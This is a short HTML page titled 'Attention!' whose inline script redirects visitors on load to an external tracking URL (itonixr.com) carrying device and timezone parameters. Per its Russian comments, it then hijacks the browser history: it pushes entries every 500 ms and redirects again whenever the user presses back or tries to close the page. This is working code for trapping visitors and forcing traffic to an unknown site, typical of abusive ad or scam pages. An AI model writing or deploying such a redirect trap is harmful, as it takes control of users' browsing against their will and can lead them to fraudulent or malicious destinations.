<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <title>Attention!</title>
  <link rel="icon" href="fav.png" />
  <script type="text/javascript">
    const redirectUrl = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';

    function trapHistory() {
      // Постоянно добавляем записи в историю, чтобы ловить "назад"
      history.pushState({}, '', window.location.href);
    }

    function redirectToTarget() {
      window.location.href = redirectUrl;
    }

    document.addEventListener('DOMContentLoaded', () => {
      // Изначальный редирект сразу после загрузки
      redirectToTarget();

      // Наполняем стек истории и ловим кнопку "назад" или крестик
      trapHistory();

      window.onpopstate = () => {
        console.log('User pressed back or tried to close the app');
        redirectToTarget();
      };

      // Повторяем ловушку каждые 500 мс, чтобы сохранить историю активной
      setInterval(trapHistory, 500);
    });
  </script>
</head>
